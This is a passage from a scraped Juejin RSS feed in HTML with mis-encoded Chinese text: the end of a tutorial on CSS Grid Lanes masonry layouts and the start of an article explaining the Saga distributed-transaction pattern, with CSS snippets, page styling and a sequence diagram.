  <span class="hljs-attribute">grid-column</span>: -<span class="hljs-number">3</span> / -<span class="hljs-number">1</span>;
}
</code></pre>
<h2 data-id="heading-6">æ”¹å˜æ–¹å‘</h2>
<p>ç½‘æ ¼è½¦é“ä¹Ÿå¯ä»¥åŒå‘æ’åˆ—ï¼</p>
<p>ä¸Šé¢çš„æ‰€æœ‰ç¤ºä¾‹åˆ›å»ºçš„æ˜¯â€œç€‘å¸ƒå¼â€å¸ƒå±€ï¼Œå†…å®¹ä»¥åˆ—çš„å½¢å¼æ’åˆ—ã€‚</p>
<p>ç½‘æ ¼è½¦é“ä¹Ÿå¯ä»¥ç”¨äºåˆ›å»ºå¦ä¸€ç§æ–¹å‘çš„å¸ƒå±€ï¼Œå³â€œç –å—å¼â€å¸ƒå±€ã€‚</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bd785169146a4b079c80b39ff00bf19f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Ya05769:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768469734&amp;x-signature=p%2FldkbgecAKVqifupFMkn9te9WI%3D" alt="" loading="lazy"/></p>
<p>å½“ä½¿ç”¨ <code>grid-template-columns</code>å®šä¹‰åˆ—æ—¶ï¼Œæµè§ˆå™¨ä¼šè‡ªåŠ¨åˆ›å»ºç€‘å¸ƒå¼å¸ƒå±€ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-class">.container</span> {
  <span class="hljs-attribute">display</span>: grid-lanes;
  <span class="hljs-attribute">grid-template-columns</span>: <span class="hljs-number">1</span>fr <span class="hljs-number">1</span>fr <span class="hljs-number">1</span>fr <span class="hljs-number">1</span>fr;
}
</code></pre>
<p>å¦‚æœä½ æƒ³è¦åæ–¹å‘çš„ç –å—å¸ƒå±€ï¼Œä½¿ç”¨ <code>grid-template-rows</code>ï¼š</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-class">.container</span> {
  <span class="hljs-attribute">display</span>: grid-lanes;
  <span class="hljs-attribute">grid-template-rows</span>: <span class="hljs-number">1</span>fr <span class="hljs-number">1</span>fr <span class="hljs-number">1</span>fr;
}
</code></pre>
<h2 data-id="heading-7">å®¹å·®</h2>
<p>â€œå®¹å·®â€æ˜¯ä¸º Grid Lanes åˆ›å»ºçš„ä¸€ä¸ªæ–°æ¦‚å¿µã€‚å®ƒå…è®¸ä½ è°ƒæ•´å¸ƒå±€ç®—æ³•åœ¨å†³å®šæ”¾ç½®é¡¹ç›®ä½ç½®æ—¶çš„ç²¾ç¡®åº¦ã€‚</p>
<p>å›åˆ°é«˜é€Ÿå…¬è·¯çš„æ¯”å–»ï¼š</p>
<p>å‡è®¾ 1 å·è½¦é“å‰é¢çš„è½¦æ¯” 2 å·è½¦é“é•¿äº† 1 å˜ç±³ï¼Œä¸‹ä¸€è¾†è½¦è¦æ’åˆ°å“ªæ¡è½¦é“ï¼Ÿ</p>
<p>å¦‚æœä¸¥æ ¼æŒ‰â€œå“ªæ¡çŸ­é€‰å“ªæ¡â€ï¼Œå®ƒä¼šé€‰ 2 å·è½¦é“ã€‚ä½† 1 å˜ç±³çš„å·®è·æ ¹æœ¬ä¸é‡è¦ï¼è¿™æ ·æ¥å›åˆ‡æ¢è½¦é“åè€Œè®©äººå›°æƒ‘ã€‚</p>
<p><strong>â€œå®¹å·®â€å°±æ˜¯å‘Šè¯‰ç³»ç»Ÿï¼šâ€œå·®è·å°äºè¿™ä¸ªå€¼ï¼Œå°±å½“ä½œä¸€æ ·é•¿â€ã€‚</strong></p>
<p>å®¹å·®é»˜è®¤å€¼æ˜¯ 1emï¼ˆå¤§çº¦ä¸€ä¸ªå­—çš„é«˜åº¦ï¼‰ã€‚</p>
<p>ä¸ºä»€ä¹ˆå®¹å·®å¾ˆé‡è¦å‘¢ï¼Ÿ</p>
<p><strong>å› ä¸ºç”¨é”®ç›˜ Tab é”®æµè§ˆç½‘é¡µçš„äººï¼ˆæ¯”å¦‚è§†éšœç”¨æˆ·ï¼‰ä¼šæŒ‰å†…å®¹é¡ºåºè·³è½¬ã€‚</strong></p>
<p>å¦‚æœå¸ƒå±€ä¹±è·³ï¼Œä»–ä»¬ä¼šå¾ˆè¿·æƒ‘ã€‚åˆé€‚çš„å®¹å·®èƒ½è®©æµè§ˆä½“éªŒæ›´æµç•…ã€‚</p>
<h2 data-id="heading-8">ç°åœ¨èƒ½ç”¨å—ï¼Ÿ</h2>
<p>ç›®å‰å¯ä»¥åœ¨ <a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.apple.com%2Fsafari%2Fresources%2F" target="_blank" title="https://developer.apple.com/safari/resources/" ref="nofollow noopener noreferrer">Safari æŠ€æœ¯é¢„è§ˆç‰ˆ 234</a> ä¸­ä½“éªŒï¼Œå…¶ä»–æµè§ˆå™¨è¿˜åœ¨å¼€å‘ä¸­ã€‚</p>
<p>è‹¹æœ WebKit å›¢é˜Ÿä» 2022 å¹´ä¸­å°±å¼€å§‹å®ç°è¿™ä¸ªåŠŸèƒ½ï¼Œç°åœ¨åŸºæœ¬è¯­æ³•å·²ç»ç¨³å®šäº†ã€‚è™½ç„¶è¿˜æœ‰äº›ç»†èŠ‚åœ¨è®¨è®ºï¼ˆæ¯”å¦‚å±æ€§å‘½åï¼‰ï¼Œä½†æ ¸å¿ƒç”¨æ³•ä¸ä¼šå˜ã€‚</p>
<p>ä½ å¯ä»¥è®¿é—® <a href="https://link.juejin.cn?target=https%3A%2F%2Fwebkit.org%2Fdemos%2Fgrid3%2F" target="_blank" title="https://webkit.org/demos/grid3/" ref="nofollow noopener noreferrer">webkit.org/demos/grid3</a> çœ‹å„ç§å®é™…ä¾‹å­ã€‚</p>
<h2 data-id="heading-9">æœ€å</h2>
<p>æ¬¢è¿å›´è§‚æˆ‘çš„â€œ<a href="https://link.juejin.cn?target=https%3A%2F%2Fyayujs.com%2F" target="_blank" title="https://yayujs.com/" ref="nofollow noopener noreferrer">ç½‘é¡µç‰ˆæœ‹å‹åœˆ</a>â€ï¼Œå…³æ³¨æˆ‘çš„å…¬ä¼—å·ï¼š<strong>å†´ç¾½ï¼ˆæˆ–æœç´¢ yayujsï¼‰</strong>ï¼Œæ¯å¤©åˆ†äº«å‰ç«¯çŸ¥è¯†ã€AI å¹²è´§ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Saga åˆ†å¸ƒå¼äº‹åŠ¡æ¨¡å¼è¯¦è§£]]></title>    <link>https://juejin.cn/post/7592765004807946291</link>    <guid>https://juejin.cn/post/7592765004807946291</guid>    <pubDate>2026-01-08T09:40:55.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592765004807946291" data-draft-id="7592816646870122505" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Saga åˆ†å¸ƒå¼äº‹åŠ¡æ¨¡å¼è¯¦è§£"/> <meta itemprop="keywords" content="æ¶æ„"/> <meta itemprop="datePublished" content="2026-01-08T09:40:55.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç‹¼çˆ·"/> <meta itemprop="url" content="https://juejin.cn/user/2418581314208279"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Saga åˆ†å¸ƒå¼äº‹åŠ¡æ¨¡å¼è¯¦è§£
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2418581314208279/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç‹¼çˆ·
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T09:40:55.000Z" title="Thu Jan 08 2026 09:40:55 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:14px;overflow-x:hidden;color:var(--cyanosis-base-color);transition:color .35s;--cyanosis-base-color:#353535;--cyanosis-title-color:#005bb7;--cyanosis-strong-color:#2196f3;--cyanosis-em-color:#4fc3f7;--cyanosis-del-color:#ccc;--cyanosis-link-color:#3da8f5;--cyanosis-linkh-color:#007fff;--cyanosis-border-color:#bedcff;--cyanosis-border-color-2:#ececec;--cyanosis-bg-color:#fff;--cyanosis-blockquote-color:#8c8c8c;--cyanosis-blockquote-bg-color:#f0fdff;--cyanosis-code-color:#c2185b;--cyanosis-code-bg-color:#fff4f4;--cyanosis-code-pre-color:#f8f8f8;--cyanosis-table-border-color:#c3e0fd;--cyanosis-table-th-color:#dff0ff;--cyanosis-table-tht-color:#005bb7;--cyanosis-table-tr-nc-color:#f7fbff;--cyanosis-table-trh-color:#e0edf7;--cyanosis-slct-title-color:#005bb7;--cyanosis-slct-titlebg-color:rgba(175,207,247,0.25);--cyanosis-slct-text-color:#c80000;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#e8ebec;--cyanosis-slct-codebg-color:#ffeaeb;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body.__dark{--cyanosis-base-color:#cacaca;--cyanosis-title-color:#ddd;--cyanosis-strong-color:#fe9900;--cyanosis-em-color:#ffd28e;--cyanosis-del-color:#ccc;--cyanosis-link-color:#ffb648;--cyanosis-linkh-color:#fe9900;--cyanosis-border-color:#ffe3ba;--cyanosis-border-color-2:#ffcb7b;--cyanosis-bg-color:#2f2f2f;--cyanosis-blockquote-color:#c7c7c7;--cyanosis-blockquote-bg-color:rgba(255,199,116,0.1);--cyanosis-code-color:#000;--cyanosis-code-bg-color:#ffcb7b;--cyanosis-code-pre-color:rgba(255,227,185,0.5);--cyanosis-table-border-color:#fe9900;--cyanosis-table-th-color:#ffb648;--cyanosis-table-tht-color:#000;--cyanosis-table-tr-nc-color:#6d5736;--cyanosis-table-trh-color:#947443;--cyanosis-slct-title-color:#000;--cyanosis-slct-titlebg-color:#fe9900;--cyanosis-slct-text-color:#00c888;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#000;--cyanosis-slct-codebg-color:#ffcb7b;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body h1{padding-bottom:4px;font-size:30px}.markdown-body h1,.markdown-body h2{margin-top:36px;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);transition:color .35s}.markdown-body h2{position:relative;padding-left:10px;padding-right:10px;padding-bottom:10px;font-size:24px;border-bottom:1px solid var(--cyanosis-border-color-2)}.markdown-body h2:before{content:"ã€Œ";position:absolute;top:-6px;left:-14px}.markdown-body h2:after{content:"ã€";position:relative;top:6px;right:auto}.markdown-body h3{position:relative;padding-bottom:0;margin-top:30px;margin-bottom:10px;font-size:20px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h3:before{content:"Â»";padding-right:6px;color:var(--cyanosis-strong-color)}.markdown-body h4{margin-top:24px;font-size:16px}.markdown-body h4,.markdown-body h5{padding-bottom:0;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h5{margin-top:18px;font-size:14px}.markdown-body h6{padding-bottom:0;margin-top:12px;margin-bottom:10px;font-size:12px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body p{line-height:inherit;margin-top:16px;margin-bottom:16px}.markdown-body img{max-width:100%}.markdown-body hr{position:relative;width:98%;height:1px;margin-top:32px;margin-bottom:32px;background-image:linear-gradient(90deg,var(--cyanosis-link-color),rgba(255,0,0,.3),hsla(0,0%,100%,.1),rgba(255,0,0,.3),var(--cyanosis-link-color));border-width:0;overflow:visible}.markdown-body hr:after{content:"";position:absolute;margin:auto;left:0;right:0;bottom:0;top:0;display:inline-block;width:60px;height:20px;background-color:var(--cyanosis-bg-color);background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAAgCAYAAABgrToAAAADoklEQVRYR82XTYgcRRTHf2933Q1RjAa9eFO8JHoJ8RQVBQ2iBwXBET0YEUTXNVmNQtTpmeqaWV0XNRq/o4KoECSCEPSg4CF+BYUkIIiCoCJCPIhC/Ihh2Z0nVV27VnZnenumW9i6ddV7//frV69fVQurfMgq56NawFTPAU6QyomqXrw6wIZeyhCPebA5buNR+akKyGoAjd6BshthnYdSjqNcRVuOlIUsD2j0SuA94IwuMHdh5ZUykOUBXfSGbmKI54EtAeYIHSZoy5dl4JxvNYBOKdW1KE8BQ8AkVk6WhasWsAiN0TX9gveXQaPP+Aytpc4u+bMI06JNohsYYYYOR2lJWtS3OKDRfcAtQfgDoI6Vo4UCGb0OmAEuDvZvYmVbEd/igC3dzDz7gQu8sPA9kJDK27mBmjqBeLjTg90PDFOjWawFFQd06kZHEfaj3LAIpTRpSXsZ5E06zEYP9sDimnAApYaV2SLZG/wjMeqAkijwW4xQJ5Gf/ZzRC8OW3hiBTGGlURRswW55Bh/Ssxljrwew8l1PQaM14GngvGDzBUKdDsMeTtgU5o8B92PFlUf3YXUrHa7Fys6lBqcCGnX15YQ2A18FyPd7Crd1A3M8C1wdbH4DD3hWeP6IEXbQkG97ajR1HPFnuPP5jFFq1OWX7hl8WM9l1AO648uNfwLk7tytMeogty+xeQ4rO3r6bdcx1nuwOGsHmaXGtPzae4uzGnLH1kQkvpdZGrHjssBZJrL+pqS05KWc8tgITAPXRzYvYOXe/C2OV43eDcRBDtIhoS2f9wzc0Cv8Wls+zoFzUC5zF0U241h5uZtPfptp6OUM8wbK+cH5GEpCS17P3fJei0Z3+npTxryJ8CPzbKMtn/ZyWbkPGl0PuFPkmkjkcb4h4R2ZLwRq1H0ALmvjkf2HwK1Y+T1PY2XABe/sHJ6MxN5lnoSpnC/UGbsTaI5phK2R7x6s3Ffk5YoDOrWm3onwJHBmEP86bPmBrsGaenNoIdnxCH+gPEhLXi0Cl1VBvyPVLSh7gEuC62yAfOIUqabWEaaiucMIk6RyqJ+Q/QM69V26jjW86Gvov/EaoyT8zRCn+Xq7PVrbx0nuYUaO9wM3WAbjCE1NEUw09Um4UV+2OKfYfu5/S19gsAzGKqm6LE5FrShbdS0ku465DjDwKA/oQht19ejqbaEVuRbiLhuHByYLjtUAZpDutzP7cYdHsPJXWbjyNVgFwQoa1WXwf4Jd9YD/Ap80+yE7+u9aAAAAAElFTkSuQmCC);background-repeat:no-repeat;background-size:auto 100%;background-position-x:center;transition:background-color .5s}.markdown-body code{padding:.065em .4em;font-size:.87em;color:var(--cyanosis-code-color);word-break:break-word;overflow-x:auto;background-color:var(--cyanosis-code-bg-color);border-radius:2px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{display:block;padding:16px 12px;margin:0;font-size:12px;color:#333;word-break:normal;overflow-x:auto;background:var(--cyanosis-code-pre-color)}.markdown-body pre&gt;code::-webkit-scrollbar{width:4px;height:4px}.markdown-body pre&gt;code::-webkit-scrollbar-track{background-color:var(--cyanosis-border-color)}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:var(--cyanosis-strong-color);border-radius:10px}.markdown-body a{position:relative;text-decoration:none;color:var(--cyanosis-link-color);border-bottom:1px solid var(--cyanosis-border-color)}.markdown-body a:hover{border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body a:active,.markdown-body a:hover{color:var(--cyanosis-linkh-color)}.markdown-body a:after{position:absolute;content:"";top:100%;left:0;width:100%;opacity:0;border-bottom:1px solid var(--cyanosis-border-color);transition:top .3s,opacity .3s;transform:translateZ(0)}.markdown-body a:hover:after{top:0;opacity:1;border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid var(--cyanosis-table-border-color);border-spacing:0;border-collapse:collapse}.markdown-body table thead{color:#000;text-align:left;font-size:14px;background:#f6f6f6}.markdown-body table tr:nth-child(2n){background-color:var(--cyanosis-table-tr-nc-color)}.markdown-body table tr:hover{background-color:var(--cyanosis-table-trh-color)}.markdown-body table td,.markdown-body table th{padding:12px 8px;line-height:24px;border:1px solid var(--cyanosis-table-border-color)}.markdown-body table th{color:var(--cyanosis-table-tht-color);background-color:var(--cyanosis-table-th-color)}.markdown-body table td{min-width:120px}.markdown-body blockquote{color:var(--cyanosis-blockquote-color);border-left:4px solid var(--cyanosis-strong-color);background-color:var(--cyanosis-blockquote-bg-color);padding:1px 20px;margin:22px 0;transition:color .35s}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body b,.markdown-body blockquote&gt;b,.markdown-body blockquote&gt;strong,.markdown-body strong{color:var(--cyanosis-strong-color)}.markdown-body em,.markdown-body i{color:var(--cyanosis-em-color)}.markdown-body del{color:var(--cyanosis-del-color)}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:4px}.markdown-body ol li{padding-left:6px}.markdown-body details&gt;summary{outline:none;color:var(--cyanosis-title-color);font-size:20px;font-weight:bolder;border-bottom:1px solid var(--cyanosis-border-color);cursor:pointer}.markdown-body details&gt;p{padding:10px 20px;margin:10px 0 0;color:#666;background-color:var(--cyanosis-blockquote-bg-color);border:2px dashed var(--cyanosis-strong-color)}.markdown-body h1::selection,.markdown-body h2::selection,.markdown-body h3::selection,.markdown-body h4::selection,.markdown-body h5::selection,.markdown-body h6::selection{color:var(--cyanosis-slct-title-color);background-color:var(--cyanosis-slct-titlebg-color)}.markdown-body ol li::selection,.markdown-body p::selection,.markdown-body ul li::selection{color:var(--cyanosis-slct-text-color);background-color:var(--cyanosis-slct-bg-color)}.markdown-body a::selection,.markdown-body b::selection,.markdown-body em::selection,.markdown-body i::selection,.markdown-body strong::selection{background-color:var(--cyanosis-slct-elbg-color)}.markdown-body del::selection{color:var(--cyanosis-slct-del-color);background-color:var(--cyanosis-slct-elbg-color)}.markdown-body table thead th::selection{background-color:transparent}.markdown-body table tbody td::selection{background-color:var(--cyanosis-slct-bg-color)}.markdown-body code::selection{background-color:var(--cyanosis-slct-codebg-color)}.markdown-body pre&gt;code::selection{background-color:var(--cyanosis-slct-prebg-color)}.markdown-body .contains-task-list{padding-left:14px;list-style:none}.markdown-body .contains-task-list input[type=checkbox]{position:relative}.markdown-body .contains-task-list input[type=checkbox]:before{content:"";position:absolute;top:0;left:0;right:0;bottom:0;width:inherit;height:inherit;background:#f0f8ff;border:1px solid #add6ff;border-radius:2px;box-sizing:border-box;z-index:1}.markdown-body .contains-task-list input[type=checkbox]:checked:after{content:"âœ“";position:absolute;top:-12px;left:0;right:0;bottom:0;width:0;height:0;color:#f55;font-size:20px;font-weight:700;z-index:2}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="srcery">.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#1c1b19;color:#fce8c3}.hljs-emphasis,.hljs-strong{color:#918175}.hljs-bullet,.hljs-link,.hljs-literal,.hljs-number,.hljs-quote,.hljs-regexp{color:#ff5c8f}.hljs-code,.hljs-selector-class{color:#68a8e4}.hljs-emphasis{font-style:italic}.hljs-attribute,.hljs-keyword,.hljs-section,.hljs-selector-tag,.hljs-variable{color:#ef2f27}.hljs-name,.hljs-title{color:#fbb829}.hljs-params,.hljs-type{color:#0aaeb3}.hljs-string{color:#98bc37}.hljs-addition,.hljs-built_in,.hljs-builtin-name,.hljs-selector-attr,.hljs-selector-id,.hljs-selector-pseudo,.hljs-subst,.hljs-symbol,.hljs-template-tag,.hljs-template-variable{color:#c07abe}.hljs-comment,.hljs-deletion,.hljs-meta{color:#918175}</style><blockquote>
<p>å…ˆå–å£æ°´ï¼Œå†çœ‹ä¸€çœ¼åˆ†å¸ƒå¼ç³»ç»Ÿï¼Œç„¶åä½ ä¼šå‘ç°ï¼š<strong>æ²¡æœ‰äº‹åŠ¡ï¼Œå¿ƒé‡Œæ²¡åº•ï¼›æœ‰äº†äº‹åŠ¡ï¼Œç³»ç»Ÿè¦å‘½ã€‚</strong></p>
</blockquote>
<p>ä½œä¸ºä¸€åå†™äº†å¾ˆå¤šå¹´ Java çš„è€å…µï¼Œä»Šå¤©æˆ‘ä»¬æ¥èŠä¸€ä¸ªåœ¨å¾®æœåŠ¡ä¸–ç•Œé‡Œ<strong>æ—¢ä¸å®Œç¾ã€ä½†å¾ˆå®ç”¨</strong>çš„æ–¹æ¡ˆâ€”â€”<strong>Saga åˆ†å¸ƒå¼äº‹åŠ¡æ¨¡å¼</strong>ã€‚</p>
<hr/>
<h2 data-id="heading-0">ä¸€ã€ä¸ºä»€ä¹ˆéœ€è¦ Sagaï¼Ÿï¼ˆé—®é¢˜ä»å“ªæ¥ï¼‰</h2>
<p>åœ¨å•ä½“åº”ç”¨é‡Œï¼Œäº‹åŠ¡æ˜¯è¿™æ ·çš„ï¼š</p>
<pre><code class="hljs language-text" lang="text">BEGIN
  A è¡¨æ‰£é’±
  B è¡¨åŠ åº“å­˜
  C è¡¨åˆ›å»ºè®¢å•
COMMIT / ROLLBACK
</code></pre>
<p>ä¸€åˆ‡éƒ½å¾ˆç¾ï¼Œç›´åˆ°ï¼š</p>
<ul>
<li>æœåŠ¡è¢«æ‹†æˆäº† <strong>å¾®æœåŠ¡</strong></li>
<li>æ•°æ®åº“è¢«æ‹†æˆäº† <strong>å¤šä¸ªåº“</strong></li>
<li>æœ¬åœ°äº‹åŠ¡å¤±æ•ˆäº†</li>
</ul>
<p>ä½ ä¼šå‘ç°ï¼š</p>
<blockquote>
<p><strong>åˆ†å¸ƒå¼ç³»ç»Ÿé‡Œï¼Œæ²¡æœ‰ä¸€ä¸ªâ€œå…¨å±€æ•°æ®åº“äº‹åŠ¡â€åœ¨ç­‰ä½ ã€‚</strong></p>
</blockquote>
<h3 data-id="heading-1">ä¼ ç»Ÿæ–¹æ¡ˆçš„é—®é¢˜</h3>
<ul>
<li>
<p><strong>2PC / XA</strong>ï¼š</p>
<ul>
<li>å¼ºä¸€è‡´</li>
<li>å¼ºä¾èµ–</li>
<li>å¼ºæ€§èƒ½æ€æ‰‹</li>
</ul>
</li>
</ul>
<p>äºæ˜¯æˆ‘ä»¬å¼€å§‹æ€è€ƒï¼š</p>
<blockquote>
<p>èƒ½ä¸èƒ½<strong>ä¸è¦å¼ºä¸€è‡´</strong>ï¼Œä½†ç³»ç»Ÿè¿˜èƒ½è·‘ï¼Ÿ</p>
</blockquote>
<p>ç­”æ¡ˆå°±æ˜¯ï¼š<strong>Saga</strong>ã€‚</p>
<hr/>
<h2 data-id="heading-2">äºŒã€Saga æ˜¯ä»€ä¹ˆï¼Ÿï¼ˆä¸€å¥è¯ç‰ˆæœ¬ï¼‰</h2>
<blockquote>
<p><strong>Saga = ä¸€è¿ä¸²æœ¬åœ°äº‹åŠ¡ + å¯¹åº”çš„è¡¥å¿äº‹åŠ¡</strong></p>
</blockquote>
<p>æ¢å¥è¯è¯´ï¼š</p>
<ul>
<li>æ¯ä¸€æ­¥éƒ½ <strong>å…ˆæäº¤</strong></li>
<li>å¦‚æœåé¢å¤±è´¥äº†</li>
<li>å°± <strong>æŒ‰ç›¸åé¡ºåºè¡¥å¿å›å»</strong></li>
</ul>
<p>å¬èµ·æ¥æ˜¯ä¸æ˜¯æœ‰ç‚¹åƒï¼š</p>
<blockquote>
<p>â€œåšé”™äº†äº‹ï¼Œé åæ‚”è¯è§£å†³ã€‚â€</p>
</blockquote>
<p>æ²¡é”™ï¼Œä½†è¿™è¯åœ¨åˆ†å¸ƒå¼ç³»ç»Ÿé‡Œï¼Œ<strong>å¾ˆå€¼é’±</strong>ã€‚</p>
<hr/>
<h2 data-id="heading-3">ä¸‰ã€Saga çš„æ ¸å¿ƒæ€æƒ³ï¼ˆé‡è¦ä½†ä¸å¤æ‚ï¼‰</h2>
<h3 data-id="heading-4">1ï¸âƒ£ æœ¬åœ°äº‹åŠ¡ä¼˜å…ˆ</h3>
<p>æ¯ä¸ªæœåŠ¡ï¼š</p>
<ul>
<li>åªæ“ä½œ <strong>è‡ªå·±çš„æ•°æ®åº“</strong></li>
<li>ä½¿ç”¨ <strong>æœ¬åœ°äº‹åŠ¡</strong>ï¼ˆSpring @Transactional é‚£å¥—ï¼‰</li>
</ul>
<h3 data-id="heading-5">2ï¸âƒ£ å¤±è´¥ â‰  å›æ»š</h3>
<p>Saga çš„ä¸–ç•Œé‡Œï¼š</p>
<ul>
<li><strong>å¤±è´¥ä¸æ˜¯ rollback</strong></li>
<li>è€Œæ˜¯ï¼š</li>
</ul>
<blockquote>
<p><strong>æ‰§è¡Œè¡¥å¿æ“ä½œï¼ˆCompensation Actionï¼‰</strong></p>
</blockquote>
<h3 data-id="heading-6">3ï¸âƒ£ æœ€ç»ˆä¸€è‡´æ€§</h3>
<ul>
<li>ä¸­é—´çŠ¶æ€å¯èƒ½ä¸ä¸€è‡´</li>
<li>ä½†æœ€ç»ˆèƒ½â€œå¯¹ä¸Šè´¦â€</li>
</ul>
<p>ä¸€å¥è¯æ€»ç»“ï¼š</p>
<blockquote>
<p><strong>Saga ä¸ä¿è¯ä½ æ—¶æ—¶å¼€å¿ƒï¼Œä½†ä¿è¯ä½ æœ€åä¸å´©ã€‚</strong></p>
</blockquote>
<hr/>
<h2 data-id="heading-7">å››ã€Saga çš„ä¸¤ç§ç»å…¸å®ç°æ–¹å¼</h2>
<h3 data-id="heading-8">æ–¹å¼ä¸€ï¼šç¼–æ’å¼ Sagaï¼ˆOrchestrationï¼‰â­ æ¨è</h3>
<p>æœ‰ä¸€ä¸ª<strong>æŒ‡æŒ¥å®˜</strong>ï¼Œç»Ÿä¸€è°ƒåº¦æµç¨‹ã€‚</p>
<pre><code class="hljs language-mermaid" lang="mermaid">sequenceDiagram
    participant SagaCoordinator
    participant OrderService
    participant PaymentService
    participant InventoryService

    SagaCoordinator-&gt;&gt;OrderService: åˆ›å»ºè®¢å•
    SagaCoordinator-&gt;&gt;PaymentService: æ‰£æ¬¾
    SagaCoordinator-&gt;&gt;InventoryService: æ‰£åº“å­˜

    InventoryService--&gt;&gt;SagaCoordinator: å¤±è´¥
    SagaCoordinator-&gt;&gt;PaymentService: é€€æ¬¾ï¼ˆè¡¥å¿ï¼‰
    SagaCoordinator-&gt;&gt;OrderService: å–æ¶ˆè®¢å•ï¼ˆè¡¥å¿ï¼‰
</code></pre>
<p><strong>ä¼˜ç‚¹</strong>ï¼š</p>
<ul>
<li>æµç¨‹æ¸…æ™°</li>
<li>æ˜“äºç›‘æ§</li>
